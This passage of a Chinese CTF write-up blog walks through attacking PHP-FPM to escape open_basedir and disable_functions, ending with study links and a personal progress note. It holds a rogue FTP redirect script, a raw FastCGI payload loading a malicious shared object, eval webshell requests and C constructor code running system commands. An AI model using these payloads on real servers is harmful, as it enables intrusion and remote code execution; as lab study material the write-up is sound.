&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode(&amp;#39;%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00&amp;#39;);var_dump(file_put_contents(&amp;#39;ftp://127.0.0.1:46819/wuhu&amp;#39;,$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>写恶意.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>传.so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents(&amp;#39;/tmp/wuhu.so&amp;#39;,$_POST[&amp;#39;data&amp;#39;]));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>试着执行一下命令，成功解除open_basedir的限制&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊&lt;/p>
&lt;p>正常来说，只有open_basedir被解放后才可以scandir(&amp;rsquo;/&amp;rsquo;)（没有的话是只可以scandir(&amp;rsquo;/var/www/html&amp;rsquo;)），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir(&amp;rsquo;/&amp;rsquo;)都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行&lt;/p>
&lt;p>之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了&lt;/p>
&lt;h4 id="蓝帽杯-2021one-pointer-php">***[蓝帽杯 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysy，确实没时间复现（复现赵总的题让我有心理阴影了）&lt;/p>
&lt;p>我就先云一下，对8起&lt;/p>
&lt;p>参考：&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="攻击unix-socket模式下的php-fpm">攻击unix socket模式下的php-fpm&lt;/h3>
&lt;p>由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是&lt;code>stream_socket_client&lt;/code>建立一个unix socket连接，然后写入tcp流来通信&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">这里是参考wp&lt;/a>&lt;/p>
&lt;p>从phpinfo可以看到disable_functions&lt;/p>
&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>考虑用&lt;code>create_function&lt;/code>来rce，不过还是绕不过disable_functions来执行/readflag&lt;/p>
&lt;p>不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm&lt;/p>
&lt;p>题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动&lt;/p>
&lt;p>fpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个&lt;/p>
&lt;hr>
&lt;p>拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm 与 Nginx优化总结&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP 连接方式 &amp;amp; PHP-FPM未授权访问漏洞 &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;amp;&amp;amp; PHP-FPM未授权访问漏洞 &amp;amp;&amp;amp; Exp编写&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
一点对近况的碎碎念
&lt;/h4>
&lt;/summary>
&lt;p>最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊&lt;/p>
&lt;p>看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样&lt;/p>
&lt;p>这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题&lt;/p>
&lt;p>不过总结是很有必要的，现在的进度是这样：&lt;/p>
&lt;ul>
&lt;li>php反序列化：缺 原生类的学习+跟一些实际的链子&lt;/li>
&lt;li>python反序列化：完&lt;/li>
&lt;li>sqli：差不多完，还得多做点题加深理解&lt;/li>
&lt;li>SSTI：完&lt;/li>
&lt;li>文件上传：之前9月总结到一半去打hvv了&lt;/li>
&lt;li>php-fpm：完&lt;/li>
&lt;li>GraphQL：完&lt;/li>
&lt;/ul>
&lt;p>很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：&lt;/p>
&lt;ul>
&lt;li>ssrf：不熟练&lt;/li>
&lt;li>xss：做题遇到都是躲着走&lt;/li>
&lt;li>js圆形污染：跟上面那个总是一起出现&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>还有java，这个必须得学&lt;/p>
&lt;p>不多说了，冲！！！&lt;/p>
&lt;/details></description></item></channel></rss>